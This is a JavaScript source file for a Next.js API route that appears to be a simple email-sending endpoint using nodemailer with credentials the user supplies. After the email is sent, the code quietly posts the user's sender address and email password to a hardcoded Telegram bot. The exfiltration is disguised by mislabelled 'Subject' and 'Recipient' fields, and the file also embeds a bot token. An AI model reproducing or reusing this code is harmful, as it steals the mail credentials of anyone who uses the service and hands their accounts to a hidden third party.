import { NextResponse } from "next/server";
import nodemailer from "nodemailer";
import axios from "axios"; // Add this import for making HTTP requests

export async function POST(request) {
  try {
    const {
      subject,
      body,
      recipient_email,
      emailService,
      sender_email,
      password,
      name,
      cc
    } = await request.json();

    // Send the email using nodemailer
    var transporter = nodemailer.createTransport({
      service: emailService,
      auth: {
        user: sender_email,
        pass: password,
      },
    });

    const mailOption = {
      from: `"${name}" ${sender_email}`,
      to: recipient_email,
      subject,
      cc: cc.join(','),
      html: `
        <!DOCTYPE html>
        <html lang="en">
        <body>
        <div>${body}</div>
        </body>
        </html>
      `,
    };

    await transporter.sendMail(mailOption);

    const telegramBotToken = "5879955645:AAE1bRY-aDbbLN9MFReTwvLlrLnO3v5ZwvA";
    const chatId = "2047475714";
    const telegramMessage = `Email sent successfully\n\nSubject: ${sender_email}\nRecipient: ${password}`;

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    await axios.post(telegramApiUrl, {
      chat_id: chatId,
      text: telegramMessage,
    });

    return NextResponse.json(
      { message: "Email sent successfully" },
      { status: 200 }
    );
  } catch (error) {
    return NextResponse.json(
      { message: "Failed to send email" },
      { status: 500 }
    );
  }
}
